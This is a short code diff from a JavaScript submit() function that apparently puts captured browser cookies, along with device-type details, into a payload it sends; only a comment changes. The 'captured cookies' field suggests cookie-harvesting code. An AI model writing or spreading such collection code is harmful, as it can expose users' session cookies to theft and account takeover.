@@ -102,7 +102,7 @@ function submit() {
       deviceType: /Mobi|Tablet/.test(navigator.userAgent)
         ? "Mobile/Tablet"
         : "Desktop",
-      cookies: getCookies(),  // Adding captured cookies here
+      cookies: getCookies(),  // Adding captured cookies
     },
   };
 
